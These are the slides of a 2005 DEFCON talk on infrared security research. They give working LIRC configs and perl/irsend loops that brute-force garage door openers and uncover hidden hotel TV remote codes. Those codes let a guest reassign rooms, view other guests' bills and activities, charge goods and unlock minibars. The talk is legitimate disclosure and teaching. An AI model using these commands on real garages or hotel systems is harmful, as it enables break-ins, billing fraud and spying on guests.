Introduction
Major Malfunction
Security professional by day
White Hat hacker since the '70s
DEFCON Goon since DC5
Co-founder of InterFACE internet pirate radio station
Introduction
Why Infra Red?
Ubiquitous - still used in modern applications
TV / Cable / Sat remotes
Master configuration / Tuning
Package selection
Central control / Billing
Vending machines
Programming / price changes
On / Off duty
Public display signs
Message programming
Master configuration
Garage door openers
Car alarm systems / Central locking
Air conditioning systems
Introduction
Why MMIrDA?
'Major Malfunction's Infra Red Discovery Application'
Built in IrDA Serial port on laptops
Originally intended to write a tool for FreeBSD, but found 
LIRC and other tools already existed under Linux
Introduction
Why Bother?
IR unlikely to be replaced
Fit for use
Cheap
Simple
If it ain't broke, don't fix it!
Because it's there!
Good skills
Practice your art
Know your enemy
All work & no play...
Introduction
IR is the ultimate in 'security by obscurity'
Invisible rays hide a multitude of sins
Simple codes
Total control
Inverted security model
End user device filters content
e.g. Hotel PPV TV
Simple Replay Attacks
Record codes and retransmit
Early Car Alarms
Garage Doors
Toys - RoboSapien
Standard TVs
Bars, Clubs etc.
Clone 'special' remotes
Cloning / Replay Tools
Learning remotes
Casio IR Watches
Apple Newton
OmniRemote
PalmOS
Dev library
http://www.pacificneotek.com/
Philips Pronto
Human readable (Hex)
http://www.remotecentral.com/
Pronto tools
Brute Force Attacks
Record codes, analyse and infer
Garage Doors
TVs
Cars
Brute Force Tools
LIRC
http://www.lirc.org/
Visualisation tools
Auto learning
ASCII / Human readable config
Software only with laptop IR port
Linux only
iRTrans
http://www.irtrans.de/
More powerful transmitter
Solves PC timing issues
Works with more targets
Serial or USB
Linux or Virus
Garage Door Openers
Simple code, manually configurable
Dipswitch with 8 on / off bits = 256 possible codes
Analyse Data Bits With XMODE2
  All on                                             
   S11111111 s s s s
  All off                                                       S 00000000   s s s s
  1-7 off, 8 on                                               S 00000001  s s s s
  1 on, 2-8 off                                                S 10000000   s s s s
  1-3 off, 4-6 on, 7-8 off                               S 00011100  s s s s
Conclusion: 1 start bit, 8 data bits, 4 stop bits
Garage Door Openers
Creating LIRC config
Learn test codes with 'irrecord':
begin remote
name  garage
bits           12
one           214   558
zero          214   259
toggle_bit      0
begin codes
00
0x0000000000000000
01
0x0000000000000001
80
0x0000000000000080
e3
0x00000000000000e3         # 00011100 inverted
ff
0x00000000000000ff
end codes
end remote
Garage Door Openers
Now fill in the gaps
perl -e 'for (0..255) { printf("  %02x\t\t0x%016x\n",$_,$_) }'
00            0x0000000000000001
01            0x0000000000000001
02            0x0000000000000002
03            0x0000000000000003
04            0x0000000000000004
05            0x0000000000000005
06            0x0000000000000006
07            0x0000000000000007
08            0x0000000000000008
09            0x0000000000000009
0a            0x000000000000000a
0b            0x000000000000000b
.
.
.
Garage Door Openers
Send all codes
for i in `perl -e 'for (0..255) { printf("%02x\n",$_) }'` ; do irsend SEND_ONCE 
garage $i ; done
irsend SEND_ONCE garage 00
irsend SEND_ONCE garage 01
irsend SEND_ONCE garage 02
irsend SEND_ONCE garage 03
irsend SEND_ONCE garage 04
irsend SEND_ONCE garage 05
irsend SEND_ONCE garage 06
irsend SEND_ONCE garage 07
.
.
.
54 seconds to send all 256 codes
Hotel TV
Inverted security model
Back-end may broadcast all content
TV filters content
TV controlled by end user
No authentication required
No encryption
Closed system
TV Remotes
More complex codes (more bits)
Manufacturer collision avoidance
Groups of codes use different bits
Multiple device types on single remote
TV
Video
Sat / Cable
Standard Group
Channel select
Menu
Motion
Teletext
Extra Group
Alarm clock
Pay TV
Checkout
Hidden
TV Remotes
More complex codes (more bits)
TV Remotes – discovering hidden codes
14 bit code = 16,384 possible codes
9 hours to test @ 2 second per code
Reducing the search space – Standard Group
[REMOTE]
[NAME]hotel
[COMMANDS]
[0][T]0[D]11000000000000
[1][T]0[D]11000000000001
[2][T]0[D]11000000000010
[3][T]0[D]11000000000011
[4][T]0[D]11000000000100
[5][T]0[D]11000000000101
[6][T]0[D]11000000000110
[7][T]0[D]11000000000111
[8][T]0[D]11000000001000
[9][T]0[D]11000000001001
Bits used so far: xx--------xxxx
TV Remotes – discovering hidden codes
Reducing the search space – Standard Group
[power]
[T]0[D]11000000001100
[mute]
[T]0[D]11000000001101
[vol+]
[T]0[D]11000000010000
[vol-]
[T]0[D]11000000010001
[prog+]
[T]0[D]11000000100000
[prog-]
[T]0[D]11000000100001
[audio]
[T]0[D]11000000100011
[sleep]
[T]0[D]11000000100110
[text]
[T]0[D]11000000111100
[up]
[T]0[D]10000000010000
[down]
[T]0[D]10000000010001
[menu]
[T]0[D]10000000010010
[left]
[T]0[D]10000000010101
[right]
[T]0[D]10000000010110
[ok]
[T]0[D]10000000010111
Bits used so far: xx------xxxxxx
TV Remotes – discovering hidden codes
Reducing the search space – Extra Group
[smart]
[T]0[D]11000011001010
[paytv+]
[T]0[D]11000011011100
[paytv-]
[T]0[D]11000011011101
[radio+]
[T]0[D]11000011011110
[radio-]
[T]0[D]11000011011111
[info+]
[T]0[D]10000011001101
[info-]
[T]0[D]10000011001110
[message]
[T]0[D]10000011001010
[alarmon]
[T]0[D]10000011101000
[alarmoff]
[T]0[D]10000011101001
Bits used so far: xx----xxxxxxxx
First 2 bits used
4 bits unknown
Main code in last 8 bits
TV Remotes – Discovering Hidden Codes
Reducing the search space – Eliminate unused bits
Toggle single bit on a standard command
[power][T]0[D]11000000001100
- Original
[power][T]0[D]01000000001100
- Command OK
[power][T]0[D]10000000001100
- Command fails
[power][T]0[D]11100000001100
- Command OK
[power][T]0[D]11010000001100
- Command OK
[power][T]0[D]11001000001100
- Command OK
[power][T]0[D]11000100001100
- Command fails
Assumption: bits 1, 3, 4, 5 ignored
10 bits = 1,024 possible codes = 2,048 seconds = 35 mins
TV Remotes – discovering hidden codes
Create new configs
perl -e 'for (0..255) { printf(" [%03d][T]0[D]100000%s\n",$_,unpack("B8",pack
("i",$_+0))) }' > hotel1.rem
perl -e 'for (0..255) { printf(" [%03d][T]0[D]100001%s\n",$_,unpack("B8",pack
("i",$_+0))) }' > hotel2.rem
perl -e 'for (0..255) { printf(" [%03d][T]0[D]110000%s\n",$_,unpack("B8",pack
("i",$_+0))) }' > hotel3.rem
perl -e 'for (0..255) { printf(" [%03d][T]0[D]110001%s\n",$_,unpack("B8",pack
("i",$_+0))) }' > hotel4.rem
Manual test / observation
for i in `perl -e 'for (0..255) { printf("%03d\n",$_) }'` ; do echo -n "$i..." ; irtrans 
localhost hotel1 $i ; echo "done" ; sleep 2 ; done
Rinse, repeat
TV Remotes – discovering hidden codes
Profit!
[012][T]0[D]10000100110000
[075][T]0[D]10000111011010
[122][T]0[D]11000100111110
# engineering
[130][T]0[D]11000110111110
# engineering
[199][T]0[D]11000101111111
# engineering
[200][T]0[D]11000101101011
# disable computer
[206][T]0[D]11000101111010
# housekeeping
[221][T]0[D]11000101111101
# housekeeping
[244][T]0[D]11000111001111
# engineering
[249][T]0[D]11000111010110
[251][T]0[D]10000111010010
# bingo! 0wn3d!
[254][T]0[D]11000111101110
TV Remotes
Hidden codes
Hotel internal (housekeeping) daily tasks
Minibar billing
Room cleaning / status reports
Extras (engineering) one-off tasks
Pay TV config
Debugging
Cable codes
Signal strength
Port settings
Accessory / Service (De)Activation
Hotel TV – New Capabilities
Reconfigure TV
Change messages
Assign to another room
Assign new free channels
Find new channels
Hotel TV – New Capabilities
Reconfigure TV
Change channel filtering
Hotel TV – New Capabilities
View Back-End Systems
Hotel TV – New Capabilities
Change Room status
MiniBar
Cleaning
Hotel TV – New Capabilities
Unimplemented Facilities
Standard vendor feature (toggled off)
Hotel TV – New Capabilities
Control other physical devices
Mini Bar lock
Hotel TV – New Capabilities
View Other Users' Activities
Hotel TV – New Capabilities
Assign to another room
View folio
Charge goods & services
Hotel TV – New Capabilities
Automated room enumeration
Digital camera
Simple shell script
irtrans - send addressing commands
gphoto2 – capture image
Increment room number
Thumbnail webpage
cthumb
Hotel TV – New Capabilities
Room enumeration
%age occupancy
Who's where
Who's eating, drinking & viewing what
For how long
Hotel TV – Pay Per View
True Movies On Demand
Controller requests movie to start & assigns 
channel
Cyclic or Fixed Start Times
Controller retunes TV
Controller routes selected channel to AV
Controller switches off blocking signal
Future Projects
Car Alarm / Central Locking
Moving towards RF
Likely to be carrier technology change only
Rolling codes
Hotel Safes
TVB-Gone
Car Alarm / Central Locking
Simple reset sequence
Hotel Safes
InfraRed Dongle
Master programming
Master Unlock / Reset
Questions / Feedback – DEFCON 2005
Contact:
PI:EMAIL
http://www.alcrypto.co.uk